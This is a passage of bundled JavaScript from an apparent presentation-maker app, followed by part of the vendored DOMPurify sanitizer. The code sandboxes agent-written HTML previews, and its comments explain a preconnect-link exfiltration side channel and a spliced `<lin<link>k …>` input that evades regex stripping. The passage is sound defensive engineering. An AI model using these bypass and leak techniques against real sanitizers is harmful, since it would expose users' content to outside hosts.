* outline, then the art direction, then the slides, without clicking. Returning
* null on the first poll matters — otherwise opening an existing deck would yank
* the user to whatever was last touched days ago.
*/
function tabToFollow(previous, next) {
	if (!previous) return null;
	let winner = null;
	let best = 0;
	for (const key of DECK_TABS) {
		const now = next[key];
		if (typeof now !== "number") continue;
		if (now > (previous[key] ?? 0) && now > best) {
			best = now;
			winner = key;
		}
	}
	return winner;
}
/** Whether a deliverable tab has content yet (slides are always reachable). */
function tabAvailable(detail, tab) {
	if (tab === "slides") return true;
	if (!detail) return false;
	return Boolean(detail.specs[tab]);
}
/**
* Turn a picked filename into a library name the backend will accept.
*
* The server enforces its own name grammar and rejects anything else, so this is
* a convenience that makes the common case (`My Deck (v2).pptx`) work rather than
* a security control.
*/
function nameFromFilename(filename, stripExtension = true) {
	return (stripExtension ? filename.replace(/\.[^.]+$/, "") : filename).replace(/[^A-Za-z0-9._-]+/g, "-").replace(/^[-.]+|[-.]+$/g, "").slice(0, 64);
}
/**
* Strip every `<link>` element from an agent-authored board.
*
* The ONE egress vector the CSP above cannot close. A `<link rel="preconnect">`
* is not a fetch, so **no fetch directive governs it** — that part is structural,
* and it is why `connect-src 'none'` and `prefetch-src 'none'` were both measured
* and both failed to stop it. At least WebKit opens a real TCP connection per
* distinct host (measured; Chromium and Firefox did not, but a speculative-loading
* optimisation is exactly the kind of thing a browser release turns on, so the
* control does not depend on which engines currently do). That makes a board
* carrying a bank of attacker-chosen hostnames a script-free side channel: the
* SUBSET of hosts it names encodes deck content, and every connection dials out.
*
* Removing the element is therefore the only mechanism that works. Nothing a
* board legitimately needs is lost: the CSP already refuses every `rel` that
* fetches (`stylesheet`, `prefetch`, `preload`, `icon`), so a surviving `<link>`
* could only ever have been a no-op or this leak. The Meetings sketch frame
* strips `<link>` from its own srcdoc for exactly this reason
* (`sketchSrcdoc.ts` `STRIPPED_TAGS`).
*
* **A real DOM parse, NOT a regex** — and this is the whole point of the
* function. A single-pass regex over the raw string is defeated by SPLICING,
* because deleting one match can join its neighbours into a live tag:
* `<lin<link>k rel=preconnect href=…>` has the inner `<link>` removed and the
* remainder closes up into an intact `<link rel=preconnect href=…>`. Measured:
* three variants of that shape survived a `/<link\b[^>]*>/gi`-style strip.
* Parsing sidesteps the class entirely — the parser resolves the document ONCE
* into a tree, so there is no re-scan for a deletion to feed.
*
* `DOMParser` (not `innerHTML`) keeps the markup inert while it is inspected: the
* document it returns is inactive, so nothing in it loads, executes or
* preconnects during the strip. Serializing the parsed tree back out also
* normalizes whatever the model wrote into markup the preview frame will parse
* the same way we just did.
*/
function stripLinkElements(html) {
	const doc = new DOMParser().parseFromString(html, "text/html");
	for (const el of Array.from(doc.querySelectorAll("link"))) el.remove();
	return doc.documentElement.outerHTML;
}
/**
* Wrap an agent-authored board document for preview in a sandboxed iframe.
*
* The CSP and the reset are prepended **ahead of every model byte**, never spliced
* in before `</head>`: a policy that appears after the markup it is meant to govern
* does not govern it, and a document whose `</head>` sits after an `<img>` would
* have leaked before the meta was parsed. Emitting both first also means a document
* with no `<head>` at all is covered identically — the parser hoists a leading
* `<meta>`/`<style>` into the implicit head.
*
* `<meta http-equiv="refresh">` is deliberately NOT stripped. Its navigation is
* gated on the *sandboxed automatic features* flag, which `sandbox=""` sets
* because the frame grants no `allow-scripts` (WHATWG HTML, shared declarative
* refresh steps) — verified refused in Chromium, Firefox and WebKit, with and
* without the CSP. A strip here would be dead code, and the real invariant it
* would obscure is that these two frames must never gain `allow-scripts`; the
* `sandbox=""` assertions in `PptxMakerPage.test.tsx` guard that instead.
*/
function prepareBoardHtml(html) {
	return "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:; form-action 'none'; base-uri 'none'\"><style data-preview-reset>html,body{margin:0!important;padding:0!important;background:transparent!important;zoom:1!important;overflow:visible!important}.slide{margin:0 auto 8px!important}</style>" + stripLinkElements(html);
}
/** How many `.slide` blocks a board document contains (at least one). */
function countBoardSlides(html) {
	const matches = html.match(/class="slide[\s"]/g);
	return matches ? matches.length : 1;
}
/** Accent swatches for a template card, in theme order. */
function templateAccents(colors) {
	if (!colors) return [];
	return [
		1,
		2,
		3,
		4,
		5,
		6
	].map((n) => colors[`accent${n}`]).filter((c) => Boolean(c));
}
// src/BoardFrame.tsx
/**
* BoardFrame — renders a style or art-direction HTML document scaled to fit.
*
* These documents are agent-authored HTML (or user-imported) at a fixed 1920x1080
* slide size. They are rendered in a **sandboxed iframe with no `allow-scripts`
* and no `allow-same-origin`**, so the document gets a null origin and cannot
* execute script or reach the dashboard. The iframe is `pointer-events: none` and
* laid out at intrinsic size, then scaled by transform so the board fills the
* panel width at any container size.
*
* `srcDoc` rather than the artifact URL: it keeps the document in the sandboxed
* null origin instead of loading it as a navigation on the dashboard origin.
*
* **Both frames here MUST go through `prepareBoardHtml`,** which prepends an
* egress-denying CSP. The sandbox stops script, but a `srcDoc` document is not
* covered by the server's response headers at all, and an empty sandbox does
* nothing about PASSIVE loads — one `<img src="https://…">` in an agent-written
* board is a GET carrying deck content off-origin with no script involved. The
* scaled preview and the thumbnail are the same document at two sizes, so a policy
* on only one of them is not a policy.
*/
function BoardFrame({ html, title }) {
	const [width, setWidth] = useState(0);
	const observerRef = useRef(null);
	const measure = useCallback((node) => {
		observerRef.current?.disconnect();
		observerRef.current = null;
		if (!node) return;
		const initial = node.getBoundingClientRect().width;
		if (initial > 0) setWidth(initial);
		if (typeof ResizeObserver === "undefined") return;
		observerRef.current = new ResizeObserver((entries) => {
			const next = entries[0]?.contentRect.width ?? 0;
			if (next > 0) setWidth(next);
		});
		observerRef.current.observe(node);
	}, []);
	const slides = countBoardSlides(html);
	const scale = width > 0 ? width / BOARD_WIDTH : 0;
	const intrinsicHeight = (BOARD_HEIGHT + 8) * slides;
	return /* @__PURE__ */ jsx("div", {
		ref: measure,
		className: "w-full",
		children: scale > 0 ? /* @__PURE__ */ jsx("div", {
			style: {
				width: "100%",
				height: intrinsicHeight * scale,
				overflow: "hidden"
			},
			children: /* @__PURE__ */ jsx("iframe", {
				srcDoc: prepareBoardHtml(html),
				sandbox: "",
				title,
				tabIndex: -1,
				className: "pointer-events-none border-none",
				style: {
					width: `${BOARD_WIDTH}px`,
					height: `${intrinsicHeight}px`,
					transform: `scale(${scale}) translateZ(0)`,
					transformOrigin: "top left"
				}
			})
		}) : /* @__PURE__ */ jsx("div", {
			className: "text-sm text-muted",
			children: i18nT("apps.pptxMaker.boardFrame.loading")
		})
	});
}
/**
* BoardThumb — a tiny non-interactive preview of a style's cover slide.
*
* Same isolation as BoardFrame (empty `sandbox`, no scripts, no same-origin),
* scaled to a fixed pixel width for the library list.
*/
function BoardThumb({ html, width = 52, title }) {
	const dimensions = {
		width: `${width}px`,
		height: `${width * 9 / 16}px`
	};
	if (!html) return /* @__PURE__ */ jsx("div", {
		className: "rounded bg-bg-elevated shrink-0 border border-border",
		style: dimensions
	});
	return /* @__PURE__ */ jsx("div", {
		className: "rounded overflow-hidden shrink-0 border border-border bg-bg-elevated",
		style: dimensions,
		children: /* @__PURE__ */ jsx("iframe", {
			srcDoc: prepareBoardHtml(html),
			sandbox: "",
			tabIndex: -1,
			title: title ?? i18nT("apps.pptxMaker.boardFrame.thumbnail"),
			"aria-hidden": "true",
			className: "pointer-events-none border-none",
			style: {
				width: `${BOARD_WIDTH}px`,
				height: `${BOARD_HEIGHT}px`,
				transform: `scale(${width / BOARD_WIDTH}) translateZ(0)`,
				transformOrigin: "top left"
			}
		})
	});
}
// node_modules/dompurify/dist/purify.es.mjs
/*! @license DOMPurify 3.4.17 | (c) Cure53 and other contributors | Released under the Apache license 2.0 and Mozilla Public License 2.0 | github.com/cure53/DOMPurify/blob/3.4.17/LICENSE */
function _OverloadYield(e, d) {
	this.v = e, this.k = d;
}
function _arrayLikeToArray(r, a) {
	(null == a || a > r.length) && (a = r.length);
	for (var e = 0, n = Array(a); e < a; e++) n[e] = r[e];
	return n;
}
function _arrayWithHoles(r) {
	if (Array.isArray(r)) return r;
}
function _iterableToArrayLimit(r, l) {
	var t = null == r ? null : "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"];
	if (null != t) {
		var e, n, i, u, a = [], f = !0, o = !1;
		try {
			if (i = (t = t.call(r)).next, 0 === l) {
				if (Object(t) !== t) return;
				f = !1;
			} else for (; !(f = (e = i.call(t)).done) && (a.push(e.value), a.length !== l); f = !0);
		} catch (r) {
			o = !0, n = r;
		} finally {
			try {
				if (!f && null != t.return && (u = t.return(), Object(u) !== u)) return;
			} finally {
				if (o) throw n;
			}
		}
		return a;
	}
}
function _nonIterableRest() {
	throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
/*! regenerator-runtime -- Copyright (c) 2014-present, Facebook, Inc. -- license (MIT): https://github.com/babel/babel/blob/main/packages/babel-helpers/LICENSE */
function _slicedToArray(r, e) {
	return _arrayWithHoles(r) || _iterableToArrayLimit(r, e) || _unsupportedIterableToArray(r, e) || _nonIterableRest();
}
function _unsupportedIterableToArray(r, a) {
	if (r) {
		if ("string" == typeof r) return _arrayLikeToArray(r, a);
		var t = {}.toString.call(r).slice(8, -1);
		return "Object" === t && r.constructor && (t = r.constructor.name), "Map" === t || "Set" === t ? Array.from(r) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? _arrayLikeToArray(r, a) : void 0;
	}
}
function AsyncGenerator(e) {
	var t, n;
	function resume(t, n) {
		try {
			var r = e[t](n), o = r.value, u = o instanceof _OverloadYield;
			Promise.resolve(u ? o.v : o).then(function(n) {
				if (u) {
					var i = "return" === t && o.k ? t : "next";
					if (!o.k || n.done) return resume(i, n);
					n = e[i](n).value;
				}
				settle(!!r.done, n);
			}, function(e) {
				resume("throw", e);
			});
		} catch (e) {
			settle(2, e);
		}
	}
	function settle(e, r) {
		2 === e ? t.reject(r) : t.resolve({
			value: r,
			done: e
		}), (t = t.next) ? resume(t.key, t.arg) : n = null;
	}
	this._invoke = function(e, r) {
		return new Promise(function(o, u) {
			var i = {
				key: e,
				arg: r,
				resolve: o,
				reject: u,
				next: null
			};
			n ? n = n.next = i : (t = n = i, resume(e, r));
		});
	}, "function" != typeof e.return && (this.return = void 0);
}
AsyncGenerator.prototype["function" == typeof Symbol && Symbol.asyncIterator || "@@asyncIterator"] = function() {
	return this;
}, AsyncGenerator.prototype.next = function(e) {
	return this._invoke("next", e);
}, AsyncGenerator.prototype.throw = function(e) {
	return this._invoke("throw", e);
}, AsyncGenerator.prototype.return = function(e) {
	return this._invoke("return", e);
};
var entries = Object.entries;
var setPrototypeOf = Object.setPrototypeOf;
var isFrozen = Object.isFrozen;
var getPrototypeOf = Object.getPrototypeOf;
var getOwnPropertyDescriptor = Object.getOwnPropertyDescriptor;
var freeze = Object.freeze;
var seal = Object.seal;
var create = Object.create;
var _ref = typeof Reflect !== "undefined" && Reflect;
var apply = _ref.apply;
var construct = _ref.construct;
if (!freeze) freeze = function freeze(x) {
	return x;
};
if (!seal) seal = function seal(x) {
	return x;
};
if (!apply) apply = function apply(func, thisArg) {
	for (var _len = arguments.length, args = new Array(_len > 2 ? _len - 2 : 0), _key = 2; _key < _len; _key++) args[_key - 2] = arguments[_key];
	return func.apply(thisArg, args);
};
if (!construct) construct = function construct(Func) {
	for (var _len2 = arguments.length, args = new Array(_len2 > 1 ? _len2 - 1 : 0), _key2 = 1; _key2 < _len2; _key2++) args[_key2 - 1] = arguments[_key2];
	return new Func(...args);
};
var arrayForEach = unapply(Array.prototype.forEach);
Array.prototype.indexOf;
var arrayLastIndexOf = unapply(Array.prototype.lastIndexOf);
var arrayPop = unapply(Array.prototype.pop);
var arrayPush = unapply(Array.prototype.push);
var arraySlice = unapply(Array.prototype.slice);
var arraySplice = unapply(Array.prototype.splice);
var arrayIsArray = Array.isArray;
var setCreate = unconstruct(Set);
var setAdd = unapply(Set.prototype.add);
var setHas = unapply(Set.prototype.has);
var stringToLowerCase = unapply(String.prototype.toLowerCase);
var stringToString = unapply(String.prototype.toString);
var stringMatch = unapply(String.prototype.match);
var stringReplace = unapply(String.prototype.replace);
var stringIndexOf = unapply(String.prototype.indexOf);
var stringTrim = unapply(String.prototype.trim);
var numberToString = unapply(Number.prototype.toString);
var booleanToString = unapply(Boolean.prototype.toString);
var bigintToString = typeof BigInt === "undefined" ? null : unapply(BigInt.prototype.toString);
var symbolToString = typeof Symbol === "undefined" ? null : unapply(Symbol.prototype.toString);
var objectHasOwnProperty = unapply(Object.prototype.hasOwnProperty);
var objectToString = unapply(Object.prototype.toString);
var regExpTest = unapply(RegExp.prototype.test);
var typeErrorCreate = unconstruct(TypeError);
/**
* Creates a new function that calls the given function with a specified thisArg and arguments.
*
* @param func - The function to be wrapped and called.
* @returns A new function that calls the given function with a specified thisArg and arguments.
*/
function unapply(func) {
	return function(thisArg) {
		if (thisArg instanceof RegExp) thisArg.lastIndex = 0;
		for (var _len3 = arguments.length, args = new Array(_len3 > 1 ? _len3 - 1 : 0), _key3 = 1; _key3 < _len3; _key3++) args[_key3 - 1] = arguments[_key3];
		return apply(func, thisArg, args);
	};
}
/**
* Creates a new function that constructs an instance of the given constructor function with the provided arguments.
*
* @param func - The constructor function to be wrapped and called.
* @returns A new function that constructs an instance of the given constructor function with the provided arguments.
*/
function unconstruct(Func) {
	return function() {
		for (var _len4 = arguments.length, args = new Array(_len4), _key4 = 0; _key4 < _len4; _key4++) args[_key4] = arguments[_key4];
		return construct(Func, args);
	};
}
/**
* Add properties to a lookup table
*
* @param set - The set to which elements will be added.
* @param array - The array containing elements to be added to the set.
* @param transformCaseFunc - An optional function to transform the case of each element before adding to the set.
* @returns The modified set with added elements.
*/
function addToSet(set, array) {
	let transformCaseFunc = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : stringToLowerCase;
	if (setPrototypeOf) setPrototypeOf(set, null);
	if (!arrayIsArray(array)) return set;
	let l = array.length;
	while (l--) {
		let element = array[l];
		if (typeof element === "string") {
			const lcElement = transformCaseFunc(element);
			if (lcElement !== element) {
				if (!isFrozen(array)) array[l] = lcElement;
				element = lcElement;
			}
		}
		set[element] = true;
	}
	return set;
}
/**
* Clean up an array to harden against CSPP
*
* @param array - The array to be cleaned.
* @returns The cleaned version of the array
*/
function cleanArray(array) {
	for (let index = 0; index < array.length; index++) if (!objectHasOwnProperty(array, index)) array[index] = null;
	return array;
}
/**
* Shallow clone an object
*
* @param object - The object to be cloned.
* @returns A new object that copies the original.
*/
function clone(object) {
	const newObject = create(null);
	for (const _ref2 of entries(object)) {
		var _ref3 = _slicedToArray(_ref2, 2);
		const property = _ref3[0];
		const value = _ref3[1];
		if (objectHasOwnProperty(object, property)) {
			if (arrayIsArray(value)) newObject[property] = cleanArray(value);
			else if (value && typeof value === "object" && value.constructor === Object) newObject[property] = clone(value);
			else newObject[property] = value;
		}
	}
	return newObject;
}
/**
* Convert non-node values into strings without depending on direct property access.
*
* @param value - The value to stringify.
* @returns A string representation of the provided value.
*/
function stringifyValue(value) {
	switch (typeof value) {
		case "string": return value;
		case "number": return numberToString(value);
		case "boolean": return booleanToString(value);
		case "bigint": return bigintToString ? bigintToString(value) : "0";
		case "symbol": return symbolToString ? symbolToString(value) : "Symbol()";
		case "undefined": return objectToString(value);
		case "function":
		case "object": {
			if (value === null) return objectToString(value);
			const valueAsRecord = value;
			const valueToString = lookupGetter(valueAsRecord, "toString");
			if (typeof valueToString === "function") {
				const stringified = valueToString(valueAsRecord);
				return typeof stringified === "string" ? stringified : objectToString(stringified);
			}
			return objectToString(value);
		}
		default: return objectToString(value);
	}
}
/**
* This method automatically checks if the prop is function or getter and behaves accordingly.
*
* @param object - The object to look up the getter function in its prototype chain.
* @param prop - The property name for which to find the getter function.
* @returns The getter function found in the prototype chain or a fallback function.
*/
function lookupGetter(object, prop) {
	while (object !== null) {
		const desc = getOwnPropertyDescriptor(object, prop);
		if (desc) {
			if (desc.get) return unapply(desc.get);
			if (typeof desc.value === "function") return unapply(desc.value);
		}
		object = getPrototypeOf(object);
	}
	function fallbackValue() {
		return null;
	}
	return fallbackValue;
}
/**
* Like lookupGetter, but for accessor properties only, and returns null
* instead of a null-returning fallback when no getter exists on the chain.
* Lets a caller fall back to a direct property read in environments that
* lack the getter, where a fallback returning null would be indistinguishable
* from a legitimate null value (e.g. namespaceURI of a no-namespace element).
*
* @param object - The object (usually a prototype) to start the lookup at.
* @param prop - The accessor property name.
* @returns The unapplied getter, or null if none was found.
*/
function lookupAccessor(object, prop) {
	while (object !== null) {
		const desc = getOwnPropertyDescriptor(object, prop);
		if (desc) return desc.get ? unapply(desc.get) : null;
		object = getPrototypeOf(object);
	}
	return null;
}
function isRegex(value) {
	try {
		regExpTest(value, "");
		return true;
	} catch (_unused) {
		return false;
	}
}
var html$1 = freeze([
	"a",
	"abbr",
	"acronym",
	"address",
	"area",
	"article",
	"aside",
	"audio",
	"b",
	"bdi",
	"bdo",
	"big",
	"blink",
	"blockquote",
	"body",
	"br",
	"button",
	"canvas",
	"caption",
	"center",
	"cite",
	"code",
	"col",
	"colgroup",
	"content",
	"data",
	"datalist",
	"dd",
	"decorator",
	"del",
	"details",
	"dfn",
	"dialog",
	"dir",
	"div",
	"dl",
	"dt",
	"element",
	"em",
	"fieldset",
	"figcaption",
	"figure",
	"font",
	"footer",
	"form",
	"h1",
	"h2",
	"h3",
	"h4",
	"h5",
	"h6",
	"head",
	"header",
	"hgroup",
	"hr",
	"html",
	"i",
	"img",
	"input",
	"ins",
	"kbd",
	"label",
	"legend",
	"li",
	"main",
	"map",
	"mark",
	"marquee",
	"menu",
	"menuitem",
	"meter",
	"nav",
	"nobr",
	"ol",
	"optgroup",
	"option",
	"output",
	"p",
	"picture",
	"pre",
	"progress",
	"q",
	"rp",
	"rt",
	"ruby",
	"s",
	"samp",
	"search",
	"section",
	"select",
	"shadow",
	"slot",
	"small",
	"source",
	"spacer",
	"span",
	"strike",
	"strong",
	"style",
	"sub",
	"summary",
	"sup",
	"table",
	"tbody",
	"td",
	"template",
	"textarea",
	"tfoot",
	"th",
	"thead",
	"time",
	"tr",
	"track",
	"tt",
	"u",
	"ul",
	"var",
	"video",
	"wbr"
]);
var svg$1 = freeze([
	"svg",
	"a",
	"altglyph",
	"altglyphdef",
	"altglyphitem",
	"animatecolor",
	"animatemotion",
	"animatetransform",
	"circle",
	"clippath",
	"defs",
	"desc",
	"ellipse",
	"enterkeyhint",
	"exportparts",
	"filter",
	"font",
	"g",
	"glyph",
	"glyphref",
	"hkern",
	"image",
	"inputmode",
	"line",
	"lineargradient",
	"marker",
	"mask",
	"metadata",
	"mpath",
	"part",
	"path",
	"pattern",
	"polygon",
	"polyline",
	"radialgradient",
	"rect",
	"stop",
	"style",
	"switch",
	"symbol",
	"text",
	"textpath",
	"title",
	"tref",
	"tspan",
	"view",
	"vkern"
]);
var svgFilters = freeze([
	"feBlend",
	"feColorMatrix",
	"feComponentTransfer",
	"feComposite",
	"feConvolveMatrix",
	"feDiffuseLighting",
	"feDisplacementMap",
	"feDistantLight",
	"feDropShadow",
	"feFlood",
	"feFuncA",
	"feFuncB",
	"feFuncG",
	"feFuncR",
	"feGaussianBlur",
	"feImage",
	"feMerge",
	"feMergeNode",
	"feMorphology",
	"feOffset",
	"fePointLight",
	"feSpecularLighting",
	"feSpotLight",
	"feTile",
	"feTurbulence"
]);
var svgDisallowed = freeze([
	"animate",
	"color-profile",
	"cursor",
	"discard",
	"font-face",
	"font-face-format",
	"font-face-name",
	"font-face-src",
	"font-face-uri",
	"foreignobject",
	"hatch",
	"hatchpath",
	"mesh",
	"meshgradient",
	"meshpatch",
	"meshrow",
	"missing-glyph",
	"script",
	"set",
	"solidcolor",
	"unknown",
	"use"
]);
var mathMl$1 = freeze([
	"math",
	"menclose",
	"merror",
	"mfenced",
	"mfrac",
	"mglyph",
	"mi",
	"mlabeledtr",
	"mmultiscripts",
	"mn",
	"mo",
	"mover",
	"mpadded",
	"mphantom",
	"mroot",
	"mrow",
	"ms",
	"mspace",
	"msqrt",
	"mstyle",
	"msub",
	"msup",
	"msubsup",
	"mtable",
	"mtd",
	"mtext",
	"mtr",
	"munder",
	"munderover",
	"mprescripts"
]);
var mathMlDisallowed = freeze([
	"maction",
	"maligngroup",
	"malignmark",
	"mlongdiv",
	"mscarries",
	"mscarry",
	"msgroup",
	"mstack",
	"msline",
	"msrow",
	"semantics",
	"annotation",
	"annotation-xml",
	"mprescripts",
	"none"
]);
var text = freeze(["#text"]);
var html = freeze([
	"accept",
	"action",
	"align",
	"alt",
	"autocapitalize",
	"autocomplete",
	"autopictureinpicture",
	"autoplay",
	"background",
	"bgcolor",
	"border",
	"capture",
	"cellpadding",
	"cellspacing",
	"checked",
	"cite",
	"class",
	"clear",
	"color",
	"cols",
	"colspan",
	"command",
	"commandfor",
	"controls",
	"controlslist",
	"coords",
	"crossorigin",
	"datetime",
	"decoding",
	"default",
	"dir",
	"disabled",
	"disablepictureinpicture",
	"disableremoteplayback",
	"download",
	"draggable",
	"enctype",
	"enterkeyhint",
	"exportparts",
	"face",
	"for",
	"headers",
	"height",
	"hidden",
	"high",
	"href",
	"hreflang",
	"id",
	"inert",
	"inputmode",
	"integrity",
	"ismap",
	"kind",
	"label",
	"lang",
	"list",
	"loading",
	"loop",
	"low",
	"max",
	"maxlength",
	"media",
	"method",
	"min",
	"minlength",
	"multiple",
	"muted",
	"name",
	"nonce",
	"noshade",
	"novalidate",
	"nowrap",
	"open",
	"optimum",
	"part",
	"pattern",
	"placeholder",
	"playsinline",
	"popover",
	"popovertarget",
	"popovertargetaction",
	"poster",
	"preload",
	"pubdate",
	"radiogroup",
	"readonly",
	"rel",
	"required",
	"rev",
	"reversed",
	"role",
	"rows",
	"rowspan",
	"spellcheck",
	"scope",
	"selected",
	"shape",
	"size",
	"sizes",
	"slot",
	"span",
	"srclang",
	"start",
	"src",
	"srcset",
	"step",
	"style",
	"summary",
	"tabindex",
	"title",
	"translate",
	"type",
	"usemap",
	"valign",
	"value",
	"width",
	"wrap",
	"xmlns"
]);
var svg = freeze([
	"accent-height",
	"accumulate",
	"additive",
	"alignment-baseline",
	"amplitude",
	"ascent",
	"attributename",
	"attributetype",
	"azimuth",
	"basefrequency",
	"baseline-shift",
	"begin",
	"bias",
	"by",
	"class",
	"clip",
	"clippathunits",
	"clip-path",
	"clip-rule",
	"color",
	"color-interpolation",
	"color-interpolation-filters",
	"color-profile",
	"color-rendering",
	"cx",
	"cy",
	"d",
	"dx",
	"dy",
	"diffuseconstant",
	"direction",
	"display",
	"divisor",
	"dominant-baseline",
	"dur",
	"edgemode",
	"elevation",
	"end",
	"exponent",
	"fill",
	"fill-opacity",
	"fill-rule",
	"filter",
	"filterunits",
	"flood-color",
	"flood-opacity",
	"font-family",
	"font-size",
	"font-size-adjust",
	"font-stretch",
	"font-style",
	"font-variant",
	"font-weight",
	"fx",
	"fy",
	"g1",
	"g2",
	"glyph-name",
	"glyphref",
	"gradientunits",
	"gradienttransform",
	"height",
	"href",
	"id",
	"image-rendering",
	"in",
	"in2",
	"intercept",
	"k",
	"k1",
	"k2",
	"k3",
	"k4",
	"kerning",
	"keypoints",
	"keysplines",
	"keytimes",
	"lang",
	"lengthadjust",
	"letter-spacing",
	"kernelmatrix",
	"kernelunitlength",
	"lighting-color",
	"local",
	"marker-end",
	"marker-mid",
	"marker-start",
	"markerheight",
	"markerunits",
	"markerwidth",
	"maskcontentunits",
	"maskunits",
	"max",
	"mask",
	"mask-type",
	"media",
	"method",
	"mode",
	"min",
	"name",
	"numoctaves",
	"offset",
	"operator",
	"opacity",
	"order",
	"orient",
	"orientation",
	"origin",
	"overflow",
	"paint-order",
	"path",
	"pathlength",
	"patterncontentunits",
	"patterntransform",
	"patternunits",
	"pointer-events",
	"points",
	"preservealpha",
	"preserveaspectratio",
	"primitiveunits",
	"r",
	"rx",
	"ry",
	"radius",
	"refx",
	"refy",
	"repeatcount",
	"repeatdur",
	"restart",
	"result",
	"rotate",
	"scale",
	"seed",
	"shape-rendering",
	"slope",
	"specularconstant",
	"specularexponent",
	"spreadmethod",
	"startoffset",
	"stddeviation",
	"stitchtiles",
	"stop-color",
	"stop-opacity",
	"stroke-dasharray",
	"stroke-dashoffset",
	"stroke-linecap",
	"stroke-linejoin",
	"stroke-miterlimit",
	"stroke-opacity",
	"stroke",
	"stroke-width",
	"style",
	"surfacescale",
	"systemlanguage",
	"tabindex",
	"tablevalues",
	"targetx",
	"targety",
	"transform",
	"transform-origin",
	"text-anchor",
	"text-decoration",
	"text-orientation",
	"text-rendering",
	"textlength",
	"type",
	"u1",
	"u2",
	"unicode",
	"values",
	"vector-effect",
	"viewbox",
	"visibility",
	"version",
	"vert-adv-y",
	"vert-origin-x",
	"vert-origin-y",
	"width",
	"word-spacing",
	"wrap",
	"writing-mode",
	"xchannelselector",
	"ychannelselector",
	"x",
	"x1",
	"x2",
	"xmlns",
	"y",
	"y1",
	"y2",
	"z",
	"zoomandpan"
]);
var mathMl = freeze([
	"accent",
	"accentunder",
	"align",
	"bevelled",
	"close",
	"columnalign",
	"columnlines",
	"columnspacing",
	"columnspan",
	"denomalign",
	"depth",
	"dir",
	"display",
	"displaystyle",
	"encoding",
	"fence",
	"frame",
	"height",
	"href",
	"id",
	"largeop",
	"length",
	"linethickness",
	"lquote",
	"lspace",
	"mathbackground",
	"mathcolor",
	"mathsize",
	"mathvariant",
	"maxsize",
	"minsize",
	"movablelimits",
	"notation",
	"numalign",
	"open",
	"rowalign",
	"rowlines",
	"rowspacing",
	"rowspan",
	"rspace",
	"rquote",
	"scriptlevel",
	"scriptminsize",
	"scriptsizemultiplier",
	"selection",
	"separator",
	"separators",
	"stretchy",
	"subscriptshift",
	"supscriptshift",
	"symmetric",
	"voffset",
	"width",
	"xmlns"
]);
var xml = freeze([
	"xlink:href",
	"xml:id",
	"xlink:title",
	"xml:space",
	"xmlns:xlink"
]);
var MUSTACHE_EXPR = seal(/{{[\w\W]*|^[\w\W]*}}/g);
var ERB_EXPR = seal(/<%[\w\W]*|^[\w\W]*%>/g);
var TMPLIT_EXPR = seal(/\${[\w\W]*/g);
var DATA_ATTR = seal(/^data-[\-\w.\u00B7-\uFFFF]+$/);
var ARIA_ATTR = seal(/^aria-[\-\w]+$/);
var IS_ALLOWED_URI = seal(/^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i);
var IS_SCRIPT_OR_DATA = seal(/^(?:\w+script|data):/i);
var ATTR_WHITESPACE = seal(/[\u0000-\u0020\u00A0\u1680\u180E\u2000-\u2029\u205F\u3000]/g);
var DOCTYPE_NAME = seal(/^html$/i);
var CUSTOM_ELEMENT = seal(/^[a-z][.\w]*(-[.\w]+)+$/i);
var ELEMENT_MARKUP_PROBE = seal(/<[/\w!]/g);
var COMMENT_MARKUP_PROBE = seal(/<[/\w]/g);
var FALLBACK_TAG_CLOSE = seal(/<\/no(script|embed|frames)/i);
var SELF_CLOSING_TAG = seal(/\/>/i);
var NODE_TYPE = {
	element: 1,
	attribute: 2,
	text: 3,
	cdataSection: 4,
	entityReference: 5,
	entityNode: 6,
	processingInstruction: 7,
	comment: 8,
	document: 9,
	documentType: 10,
	documentFragment: 11,
	notation: 12
};
var LITERAL_TEXT_ELEMENTS = freeze(addToSet({}, [
	"style",
	"script",
	"xmp",
	"iframe",
	"noembed",
	"noframes",
	"plaintext",
	"noscript"
]));
var getGlobal = function getGlobal() {
	return typeof window === "undefined" ? null : window;
};
/**
* Creates a no-op policy for internal use only.
* Don't export this function outside this module!
* @param trustedTypes The policy factory.
* @param purifyHostElement The Script element used to load DOMPurify (to determine policy name suffix).
* @return The policy created (or null, if Trusted Types
* are not supported or creating the policy failed).
*/
var _createTrustedTypesPolicy = function _createTrustedTypesPolicy(trustedTypes, purifyHostElement) {
	if (typeof trustedTypes !== "object" || typeof trustedTypes.createPolicy !== "function") return null;
	let suffix = null;
	const ATTR_NAME = "data-tt-policy-suffix";
	if (purifyHostElement && purifyHostElement.hasAttribute(ATTR_NAME)) suffix = purifyHostElement.getAttribute(ATTR_NAME);
	const policyName = "dompurify" + (suffix ? "#" + suffix : "");
	try {
		return trustedTypes.createPolicy(policyName, {
			createHTML(html) {
				return html;
			},
			createScriptURL(scriptUrl) {
				return scriptUrl;
			}
		});
	} catch (_) {
		console.warn("TrustedTypes policy " + policyName + " could not be created.");
		return null;
	}
};
var _createHooksMap = function _createHooksMap() {
	return {
		afterSanitizeAttributes: [],
		afterSanitizeElements: [],
		afterSanitizeShadowDOM: [],
		beforeSanitizeAttributes: [],
		beforeSanitizeElements: [],
		beforeSanitizeShadowDOM: [],
		uponSanitizeAttribute: [],
		uponSanitizeElement: [],
		uponSanitizeShadowNode: []
	};
};
/**
* Resolve a set-valued configuration option: a fresh set built from
* cfg[key] when it is an own array property (seeded with a clone of
* options.base when given, case-normalized via options.transform),
* the fallback set otherwise.
*
* @param cfg the cloned, prototype-free configuration object
* @param key the configuration property to read
* @param fallback the set to use when the option is absent or not an array
* @param options transform and optional base set to merge into
* @returns the resolved set
*/
var _resolveSetOption = function _resolveSetOption(cfg, key, fallback, options) {
	return objectHasOwnProperty(cfg, key) && arrayIsArray(cfg[key]) ? addToSet(options.base ? clone(options.base) : {}, cfg[key], options.transform) : fallback;
};
/**
* Resolve an object-valued configuration option: a prototype-free clone
* of cfg[key] when it is an own, truthy object property, else a fresh
* fallback built by makeFallback (fresh on every parse, so a previous
* parse can never leak state into the next one).
*
* @param cfg the cloned, prototype-free configuration object
